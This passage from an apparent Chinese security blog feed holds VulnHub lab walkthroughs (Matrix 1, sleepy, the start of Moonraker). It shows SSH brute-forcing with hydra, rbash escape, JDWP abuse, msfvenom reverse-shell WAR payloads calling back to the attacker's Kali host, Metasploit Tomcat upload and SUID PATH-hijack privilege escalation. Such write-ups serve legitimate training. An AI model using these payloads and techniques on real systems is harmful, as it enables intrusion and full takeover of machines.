class="line">+[-&gt;- --&lt;]&gt; ---.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ ++.-- .---- ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+</span><br><span class="line">+++++ .&lt;+++ +++++ +[-&gt;- ----- ---&lt;] &gt;---- ---.&lt; +++++ +++[- &gt;++++ ++++&lt;</span><br><span class="line">]&gt;+.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;--. &lt;++++ ++++[</span><br><span class="line">-&gt;+++ +++++ &lt;]&gt;++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; .&lt;+++</span><br><span class="line">[-&gt;++ +&lt;]&gt;+ ++++. +.&lt;++ +++++ +[-&gt;- ----- --&lt;]&gt; ----- ---.&lt; +++[- &gt;---&lt;</span><br><span class="line">]&gt;--- .&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;++++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++</span><br><span class="line">+[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; ---&lt;] &gt;---. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- -----</span><br><span class="line">-.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++++ +++++ +++++ +.&lt;++ +[-&gt;- --&lt;]&gt; -----</span><br><span class="line">-.&lt;++ ++[-&gt; ++++&lt; ]&gt;++. .++++ .---- ----. +++.&lt; +++[- &gt;---&lt; ]&gt;--- --.&lt;+</span><br><span class="line">+++++ ++[-&gt; ----- ---&lt;] &gt;---- .&lt;+++ +++++ [-&gt;++ +++++ +&lt;]&gt;+ +++++ +++++</span><br><span class="line">.&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- ----- -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;++ +++++</span><br><span class="line">+++.. &lt;++++ +++[- &gt;---- ---&lt;] &gt;---- ----- --.&lt;+ +++++ ++[-&gt; +++++ +++&lt;]</span><br><span class="line">&gt;++.&lt; +++++ [-&gt;-- ---&lt;] &gt;-..&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- ----- ---.-</span><br><span class="line">--.&lt;+ +++++ ++[-&gt; +++++ +++&lt;] &gt;++++ .&lt;+++ ++[-&gt; +++++ &lt;]&gt;++ +++++ +.+++</span><br><span class="line">++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----. &lt;++++ +[-&gt;-</span><br><span class="line">----&lt; ]&gt;-.&lt; +++++ [-&gt;++ +++&lt;] &gt;++++ ++++. &lt;++++ +[-&gt;+ ++++&lt; ]&gt;+++ +++++</span><br><span class="line">+.&lt;++ ++[-&gt; ++++&lt; ]&gt;+.+ .&lt;+++ +[-&gt;- ---&lt;] &gt;---- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +..&lt;+</span><br><span class="line">++[-&gt; +++&lt;] &gt;++++ .&lt;+++ +++++ [-&gt;-- ----- -&lt;]&gt;- ----- ----- --.&lt;+ ++[-&gt;</span><br><span class="line">---&lt;] &gt;---. &lt;++++ ++[-&gt; +++++ +&lt;]&gt;+ ++++. &lt;++++ ++[-&gt; ----- -&lt;]&gt;- ----.</span><br><span class="line">&lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ ++++. +++++ ++++. +++.&lt; +++[- &gt;---&lt; ]&gt;--.</span><br><span class="line">--.&lt;+ ++[-&gt; +++&lt;] &gt;++++ ++.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-- -.&lt;++ +++++</span><br><span class="line">+[-&gt;+ +++++ ++&lt;]&gt; +++++ +++++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;--.&lt; ++++[ -&gt;+++ +&lt;]&gt;+</span><br><span class="line">+.+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++</span><br><span class="line">+.+++ .---- ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- ---.&lt; +++++</span><br><span class="line">+++[- &gt;++++ ++++&lt; ]&gt;+++ .++++ +.--- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; +.&lt;++ ++[-&gt;</span><br><span class="line">----&lt; ]&gt;-.+ +.&lt;++ ++[-&gt; ++++&lt; ]&gt;+.&lt; +++[- &gt;---&lt; ]&gt;--- ---.&lt; +++[- &gt;+++&lt;</span><br><span class="line">]&gt;+++ +.+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- -.&lt;++ +++++ ++[-&gt; +++++ ++++&lt;</span><br><span class="line">]&gt;++. ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- ---.&lt; +++++ +[-&gt;+</span><br><span class="line">+++++ &lt;]&gt;++ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ---.&lt; +++++ +++[- &gt;++++ ++++&lt;</span><br><span class="line">]&gt;+++ +++++ .---- ---.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; -.&lt;++</span><br><span class="line">+++++ +[-&gt;- ----- --&lt;]&gt; ----- .&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;+.&lt;+ ++[-&gt;</span><br><span class="line">---&lt;] &gt;---- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +.--- -.&lt;++ +[-&gt;- --&lt;]&gt; --.++ .++.- .&lt;+++</span><br><span class="line">+++++ [-&gt;-- ----- -&lt;]&gt;- ---.&lt; +++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ .&lt;+++</span><br><span class="line">[-&gt;-- -&lt;]&gt;- ----. &lt;+++[ -&gt;+++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++ ++[-&gt;</span><br><span class="line">----- ---&lt;] &gt;---- ----. &lt;++++ +++[- &gt;++++ +++&lt;] &gt;++++ +++.. &lt;++++ +++[-</span><br><span class="line">&gt;---- ---&lt;] &gt;---- ---.&lt; +++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ ++.-- .++++ +++.&lt;</span><br><span class="line">+++++ ++++[ -&gt;--- ----- -&lt;]&gt;- ----- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++</span><br><span class="line">+++++ +.&lt;++ +[-&gt;- --&lt;]&gt; -.+++ +++.- --.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-.</span><br><span class="line">&lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ .++++ +++++ .&lt;+++ +[-&gt;- ---&lt;]</span><br><span class="line">&gt;--.+ +++++ ++.&lt;+ +++++ ++[-&gt; ----- ---&lt;] &gt;---- ----- --.&lt;+ +++++ ++[-&gt;</span><br><span class="line">+++++ +++&lt;] &gt;+.&lt;+ ++[-&gt; +++&lt;] &gt;++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .&lt;+++ +++++ [-&gt;--</span><br><span class="line">----- -&lt;]&gt;- ---.&lt; +++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +++.+ ++.++ +++.&lt; +++[-</span><br><span class="line">&gt;---&lt; ]&gt;-.&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt;</span><br><span class="line">+++.&lt; +++[- &gt;+++&lt; ]&gt;+++ .+++. .&lt;+++ [-&gt;-- -&lt;]&gt;- ---.- -.&lt;++ ++[-&gt; ++++&lt;</span><br><span class="line">]&gt;+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++</span><br><span class="line">.+.-- .---- ----- .++++ +.--- ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- -----</span><br><span class="line">.&lt;+++ +++++ [-&gt;++ +++++ +&lt;]&gt;+ +++++ +++++ ++++. ----- ----. &lt;++++ ++++[</span><br><span class="line">-&gt;--- ----- &lt;]&gt;-- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ ++++.</span><br><span class="line">&lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; ++..+ +++.- ----- --.++ +.&lt;++</span><br><span class="line">+[-&gt;- --&lt;]&gt; ----- .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- --.&lt;+ ++++[ -&gt;--- --&lt;]&gt;</span><br><span class="line">----- ---.- --.&lt;</span><br></pre></td></tr></table></figure><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">brainfuck解码</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You can enter into matrix as guest, with password k1ll0rXX</span><br><span class="line">Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.</span><br></pre></td></tr></table></figure><p>##ssh爆破<br>我可以用guest用户登陆，密码是k1ll0rXX最后两位未知，只有通过生成密码去爆破了</p><p>使用crunch生成密码字典<br><code>crunch 8 8 -t k1ll0r%@ &gt; 1.txt</code></p><p><img src="/2/8.png" alt=""></p><p>使用hydra来爆破ssh</p><p>hydra -l guest -P dict.txt 10.10.10.135 ssh</p><p><img src="/2/9.png" alt=""></p><p>获得登陆密码：k1ll0r7n</p><p>登陆后ls发现</p><p><img src="/2/10.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">guest@porteus:~$ ls</span><br><span class="line">-rbash: /bin/ls: restricted: cannot specify `/&apos; in command names</span><br></pre></td></tr></table></figure><p>##rbash逃逸<br>查了下rbash，当前shell受限制,很多命令不能执行</p><p><img src="/2/11.png" alt=""></p><p>检测SHELL环境变量发现为rbash变量</p><p><code>echo /home/guest/prog/*</code><br>查找内部的可执行文件发现可以用vi</p><p>我们能用vi构造/bin/bash逃离rbash</p><p><img src="/2/12.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export SHELL=/bin/bash:$SHELL</span><br><span class="line">export PATH=/usr/bin:$PATH</span><br></pre></td></tr></table></figure><p>我们只要export /bin/bash到shell环境变量 /usr.bin到path环境变量中就可以正常运行linux命令了</p><p>##获取root权限<br>export到环境变量后，我们检查sudoers文件列表，找到我们可以直接获得root shell</p><p><code>sudo -l</code><br><img src="/2/13.png" alt=""><br>再次使用我们之前找到密码运行的命令，以root身份登录<br><img src="/2/14.png" alt=""></p><p>##Get_flag<br><code>cd /root</code></p><p><code>cat flag.txt</code></p><p><img src="/2/15.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#vulnhub|渗透测试Matrix 1&lt;/p&gt;
&lt;p&gt;##题记&lt;/p&gt;
&lt;p&gt;最近在打靶机，发现了一个挺有意思的靶机，这里想跟大家分享一下.&lt;/p&gt;
&lt;p&gt;##环境准备&lt;br&gt;vulnhub最近出的一台靶机&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.vul
      
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>vulnhub|渗透测试sleepy</title>
    <link href="http://yoursite.com/2019/07/23/sleepy/"/>
    <id>http://yoursite.com/2019/07/23/sleepy/</id>
    <published>2019-07-23T01:26:00.000Z</published>
    <updated>2020-04-07T05:33:09.632Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试-sleepy"><a href="#渗透测试-sleepy" class="headerlink" title="渗透测试|sleepy"></a>渗透测试|sleepy</h2><h2 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h2><p>vulnhub的一个靶机，出的非常有质量，考的知识点很多，花了很多时间取整理，希望大家能学到东西</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>sleepy.ova (Size: 699 MB)</p><p>Download (Mirror): <a href="https://download.vulnhub.com/devrandom/sleepy.ova" target="_blank" rel="noopener">https://download.vulnhub.com/devrandom/sleepy.ova</a></p><p>Download (Torrent): <a href="https://download.vulnhub.com/devrandom/sleepy.ova.torrent" target="_blank" rel="noopener">https://download.vulnhub.com/devrandom/sleepy.ova.torrent</a>     ( Magnet)</p><p>攻击机 Kali IP : 192.168.10.128</p><p>靶机在同一C段下 IP ：192.168.10.129</p><p>这个靶机有一点难度</p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>使用命令<code>nmap -sP 192.168.10.0/24</code></p><p><img src="/5/1.png" alt=""></p><p><code>nmap -T4 -A 192.168.10.129</code></p><p><img src="/5/2.png" alt=""></p><p>我们发现有一个FTP服务器，允许匿名登录</p><p>用户名anonymous</p><p>密码为空</p><p>探索一下看有什么东西没有</p><p><img src="/5/3.png" alt=""></p><p>然后只找到一张图片</p><p><img src="/5/4.png" alt=""></p><p>就是一个在睡觉的小矮人，没什么用，接着换个思路</p><p><img src="/5/5.png" alt=""></p><h2 id="Tomcat探索"><a href="#Tomcat探索" class="headerlink" title="Tomcat探索"></a>Tomcat探索</h2><p>我检查Tomcat的常见的登录信息，试了tomcat / s3cr3t, admin / admin，弱口令未果。我注意到，Tomcat版本是很老，但没有显著公开的漏洞<br>,后台有个war自解压getsehll楼的那个，看来得获得登陆凭证</p><h2 id="JDWP突破"><a href="#JDWP突破" class="headerlink" title="JDWP突破"></a>JDWP突破</h2><p>9001端口是个java调试端口</p><p>jdb -attach 192.168.10.129:9001</p><p>一旦连接成功，我得到运行的线程的列表，然后再打断他们中的一个，这样我就可以执行任意的Java代码了</p><p><img src="/5/6.png" alt=""></p><p>我们看到了关键信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&quot;sl33py&quot; password=&quot;Gu3SSmYStR0NgPa$sw0rD!&quot;</span><br></pre></td></tr></table></figure><p>现在，我们有一个Tomcat的用户了</p><p>利用<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.10.128 LPORT=8888 -f war &gt; 1.war</code><br>生成一个war的反弹shell</p><p>开启msf监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set PAYLOAD java/jsp_shell_reverse_tcp</span><br><span class="line">PAYLOAD =&gt; java/jsp_shell_reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.10.128</span><br><span class="line">LHOST =&gt; 192.168.10.128</span><br><span class="line">msf exploit(handler) &gt; set LPORT 8888</span><br><span class="line">LPORT =&gt; 8888</span><br><span class="line">msf exploit(handler) &gt; set ExitOnSession false</span><br><span class="line">ExitOnSession =&gt; false</span><br><span class="line">msf exploit(handler) &gt; exploit -j -z</span><br></pre></td></tr></table></figure><p>然后我登录到Tomcat，上传WAR</p><p>这里遇到个问题，没有开启8080端口</p><p>不过可以通过AJP的8009端口利用</p><p>现附上学习教程<br><a href="http://www.vuln.cn/6523" target="_blank" rel="noopener">Tomcat的8009端口AJP的利用</a></p><p>BT5默认apache2是安装的，我们仅需要安装mod-jk，jk模块用于Apache和tomcat直接的交互</p><p>apt-get install libapache2-mod-jk </p><p>kali上创建JServ代理自动化的脚本：exp.sh写入如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">    apt-get install libapache2-mod-jk -y</span><br><span class="line">    sed -i &apos;s#JkWorkersFile /etc/libapache2-mod-jk/workers.properties#JkWorkersFile /etc/apache2/workers.properties#g&apos; /etc/apache2/mods-enabled/jk.conf</span><br><span class="line">    cp /etc/libapache2-mod-jk/workers.properties /etc/apache2/</span><br><span class="line">    sed -i &apos;s#worker.ajp13_worker.host=localhost#worker.ajp13_worker.host=192.168.10.129#g&apos; /etc/apache2/workers.properties</span><br><span class="line">    sed  &apos;/\Host\&gt;/i JKMount /* ajp13_worker&apos; /etc/apache2/sites-enabled/000-default.conf</span><br><span class="line">    a2enmod proxy_http proxy_ajp</span><br><span class="line">    service apache2 restart</span><br></pre></td></tr></table></figure><p>执行exp.sh脚本</p><p><img src="/5/7.png" alt=""></p><p>Tomcat现已公开，并且已获得登录凭据，现在可以通过Tomcat Manager登录并通过上传war获取shell</p><p>输入密码登陆tomcat管理界面</p><p><img src="/5/8.png" alt=""></p><p>上传之前生成得1.war反弹sehll得exp</p><p><img src="/5/9.png" alt=""></p><p>注意上传之前要开启msf监听</p><p>或者嫌麻烦得话有个更快捷的方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">use multi/http/tomcat_mgr_upload</span><br><span class="line"></span><br><span class="line">set HttpPassword  Gu3SSmYStR0NgPa$sw0rD!</span><br><span class="line"></span><br><span class="line">set HttpUsername  sl33py</span><br><span class="line"></span><br><span class="line">set RHOST         127.0.0.1</span><br><span class="line"></span><br><span class="line">set RPORT         80 </span><br><span class="line"></span><br><span class="line">set payload java/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">LHOST  192.168.10.128</span><br><span class="line"></span><br><span class="line">set LPORT  8888</span><br><span class="line"></span><br><span class="line">set FingerprintCheck false</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>注意set FingerprintCheck false一定要设置，不然就会检测指纹不匹配而爆错</p><p>运行效果：</p><p><img src="/5/10.png" alt=""></p><p>可以直接获得一个meterpreter的sesssion</p><p>##权限提升</p><p>执行命令shell获取一个cmd窗口</p><p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>用Python调用pty建立原生终端</p><p>第一步搜索SUID文件<br> find / -user root -perm -4000 -print 2&gt; /dev/null</p><p>在root用户拥有的文件中查找具有setUID（-perm -4000）</p><p>然后取消错误的输出</p><p>发现了一个名为nightmare的二进制文件</p><p><img src="/5/11.png" alt=""></p><p><code>strings /usr/bin/nightmare</code></p><p>用cat命令的时候发现会有很多乱码，所以建议使用strings命令方便查看</p><p>发现如下内容<br><img src="/5/12.png" alt=""></p><p>二进制文件nightmare似乎以 root用户的/usr/bin/sl执行的</p><p>##逆向分析<br>我们用meterpreter 的download命令把该文件下载下来逆向分析一波</p><p>我们先pdf所有的main代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">r2 nightmare </span><br><span class="line">[0x004006b0]&gt; aa</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[0x004006b0]&gt; pdf @ main</span><br><span class="line">/ (fcn) sym.main 250</span><br><span class="line">|           0x0040083e    55           push rbp</span><br><span class="line">|           0x0040083f    4889e5       mov rbp, rsp</span><br><span class="line">|           0x00400842    4881eca0000. sub rsp, 0xa0</span><br><span class="line">|           0x00400849    488d8560fff. lea rax, [rbp-0xa0]</span><br><span class="line">|           0x00400850    ba98000000   mov edx, 0x98</span><br><span class="line">|           0x00400855    be00000000   mov esi, 0x0</span><br><span class="line">|           0x0040085a    4889c7       mov rdi, rax</span><br><span class="line">|           ; CODE (CALL) XREF from 0x00400660 (fcn.00400656)</span><br><span class="line">|           0x0040085d    e8fefdffff   call sym.imp.memset</span><br><span class="line">|              sym.imp.memset(unk)</span><br><span class="line">|           0x00400862    48c78560fff. mov qword [rbp-0xa0], sym.sigHandler</span><br><span class="line">|           0x0040086d    c745e800000. mov dword [rbp-0x18], 0x0</span><br><span class="line">|           0x00400874    488d8560fff. lea rax, [rbp-0xa0]</span><br><span class="line">|           0x0040087b    ba00000000   mov edx, 0x0</span><br><span class="line">|           0x00400880    4889c6       mov rsi, rax</span><br><span class="line">|           0x00400883    bf02000000   mov edi, 0x2</span><br><span class="line">|           ; CODE (CALL) XREF from 0x00400610 (fcn.00400606)</span><br><span class="line">|           0x00400888    e883fdffff   call sym.imp.sigaction</span><br><span class="line">|              sym.imp.sigaction()</span><br></pre></td></tr></table></figure></p><p>我注意到有一个函数sym.sigHandler来处理信号SIGINT(0x2)和SIGTERM(0xf)，所以我决定把它打印出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> pdf @ sym.sigHandler</span><br><span class="line">/ (fcn) sym.sigHandler 281</span><br><span class="line">|           0x0040081f    55           push rbp</span><br><span class="line">|           0x00400820    4889e5       mov rbp, rsp</span><br><span class="line">|           0x00400823    4883ec10     sub rsp, 0x10</span><br><span class="line">|           0x00400827    897dfc       mov [rbp-0x4], edi</span><br><span class="line">|           0x0040082a    b800000000   mov eax, 0x0</span><br><span class="line">|           0x0040082f    e899ffffff   call sym.train</span><br><span class="line">|              sym.train(unk)</span><br><span class="line">|           0x00400834    bf00000000   mov edi, 0x0</span><br><span class="line">|           0x00400839    e862feffff   call sym.imp.exit</span><br><span class="line">|              sym.imp.exit()</span><br><span class="line">/ (fcn) sym.main 250</span><br></pre></td></tr></table></figure><p>注意到一个函数sym.train</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[0x004006b0]&gt; pdf @ sym.train</span><br><span class="line">|           ; CODE (CALL) XREF from 0x0040082f (unk)</span><br><span class="line">|           ; CODE (CALL) XREF from 0x004007cd (unk)</span><br><span class="line">|           ; CODE (CALL) XREF from 0x0040080f (unk)</span><br><span class="line">/ (fcn) sym.train 66</span><br><span class="line">|           0x004007cd    55           push rbp</span><br><span class="line">|           0x004007ce    4889e5       mov rbp, rsp</span><br><span class="line">|           0x004007d1    ba00000000   mov edx, 0x0</span><br><span class="line">|           0x004007d6    be00000000   mov esi, 0x0</span><br><span class="line">|           0x004007db    bf00000000   mov edi, 0x0</span><br><span class="line">|           0x004007e0    b800000000   mov eax, 0x0</span><br><span class="line">|           0x004007e5    e836feffff   call sym.imp.setresuid</span><br><span class="line">|              sym.imp.setresuid(unk)</span><br><span class="line">|           0x004007ea    ba00000000   mov edx, 0x0</span><br><span class="line">|           0x004007ef    be00000000   mov esi, 0x0</span><br><span class="line">|           0x004007f4    bf00000000   mov edi, 0x0</span><br><span class="line">|           0x004007f9    b800000000   mov eax, 0x0</span><br><span class="line">|           0x004007fe    e82dfeffff   call sym.imp.setresgid</span><br><span class="line">|              sym.imp.setresgid()</span><br><span class="line">|           0x00400803    bfec094000   mov edi, str.usrbinslal</span><br><span class="line">|           ; CODE (CALL) XREF from 0x00400640 (fcn.00400636)</span><br><span class="line">|           0x00400808    e833feffff   call sym.imp.system</span><br><span class="line">|              sym.imp.system()</span><br><span class="line">|           0x0040080d    5d           pop rbp</span><br><span class="line">\           0x0040080e    c3           ret</span><br></pre></td></tr></table></figure><p>在此函数中sym.train，我们注意到uid和gid已设置为“0”（即ROOT），然后使用参数进行系统调用str.usrbinslal。</p><p>通过pdf字符串“str.usrbinslal”如下所示，我知道系统函数<code>system(&quot;/usr/bin/sl -al&quot;)</code>已被调用 </p><p>所以我通过使用sl的完整路径作为名称来定义一个危险函数/usr/bin/sl，然后运行易受攻击的程序nightmare</p><p>这里又有一个问题为了发送linux终止信号SIGTERM给程序nightware</p><p>所以我们必须刷新tomcat那里上传的war文件重新获取一个shell</p><p><img src="/5/15.png" alt=""><br>在执行之后/usr/bin/nightmare，必须使用另一个shell的kill -2来终止nightmare进程，以便root shell正确生成。要搜索进程使用ps aux | grep nightmare和使用kill -2命令来杀死pid。</p><p><img src="/5/13.png" alt=""><br>这样我们就获取了root权限了</p><p>##拿取flag</p><p><code>cd  /root</code></p><p><code>ls</code></p><p><code>cat flag.txt</code></p><p><img src="/5/14.png" alt=""></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这个靶机考的知识点挺多的，可以研究学习一下</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试-sleepy&quot;&gt;&lt;a href=&quot;#渗透测试-sleepy&quot; class=&quot;headerlink&quot; title=&quot;渗透测试|sleepy&quot;&gt;&lt;/a&gt;渗透测试|sleepy&lt;/h2&gt;&lt;h2 id=&quot;题记&quot;&gt;&lt;a href=&quot;#题记&quot; class=&quot;head
      
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>渗透测试|Moonraker</title>
    <link href="http://yoursite.com/2019/05/22/Moonraker/"/>
    <id>http://yoursite.com/2019/05/22/Moonraker/</id>
    <published>2019-05-22T01:25:00.000Z</published>
    <updated>2020-04-07T15:56:57.152Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试-Moonraker"><a href="#渗透测试-Moonraker" class="headerlink" title="渗透测试|Moonraker"></a>渗透测试|Moonraker</h2><h2 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h2><p>靶机描述：你已经收到了一个新的恶棍的情报，他们大量投资太空和激光技术。虽然Villian不为人知，但我们知道动机是不祥的和世界末日的。</p><p>深入了解Moonraker系统，一劳永逸地发现这些威胁计划的背后是谁。在为时已晚之前找到并摧毁恶棍！</p><ul><li><p>难度：具有挑战性</p></li><li><p>标志是/root/flag.txt</p></li><li><p>在VMware上测试</p></li><li><p>启用DCHP</p></li><li><p>默认情况下除了Kali之外没有额外的工具</p></li><li><p>学习目标：客户端攻击，NoSQL，RESTful，NodeJS，Linux Enumeration和Google-fu。</p></li></ul><p>感谢/ u / limbernie在Reddit上进行测试！</p><p>祝好运并玩得开心点！</p><p>可以看出该靶机还是有一定难度的</p><p>##环境准备<br>vulnhub最近出的一台靶机</p><p><a href="https://www.vulnhub.com/entry/moonraker-1,264/" target="_blank" rel="noopener">靶机地址</a></p><p>Moonraker.ova (Size: 2.4 GB)</p><p>Download: <a href="http://drive.google.com/open?id=13b2ewq5yqre2UbkLxZ58uHtLfk-SHvmA" target="_blank" rel="noopener">http://drive.google.com/open?id=13b2ewq5yqre2UbkLxZ58uHtLfk-SHvmA</a></p><p>Download (Torrent): <a href="https://download.vulnhub.com/moonraker/Moonraker.ova.torrent" target="_blank" rel="noopener">https://download.vulnhub.com/moonraker/Moonraker.ova.torrent</a>     ( Magnet)</p><p>攻击机 Kali IP 192.168.10.128</p><p>靶机在同一C段下 IP 192.168.10.130</p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>使用命令<code>nmap -sP 192.168.10.0/24</code></p><p><img src="/4/1.png" alt=""></p><p>找到靶机ip 192.168.10.130</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>我们需要知道目标机器上开了哪些端口，运行了哪些服务，利用某些服务的漏洞来进行攻击，所以我们先进行端口扫描。</p><p><code>nmap -p- -A -T4 192.168.10.130</code></p><p>nmap扫描输出显示各种开放端口：22（ssh），80（http），110（pop3），3000（http），4369（epmd），5984（couchdb）。</p><p><img src="/4/3.png" alt=""></p><p>从NMAP扫描输出，我们看到80端口是开放的。因此，我们定位到80端口的Web浏览器。但它没有太大的帮助继续。</p><p><img src="/4/2.png" 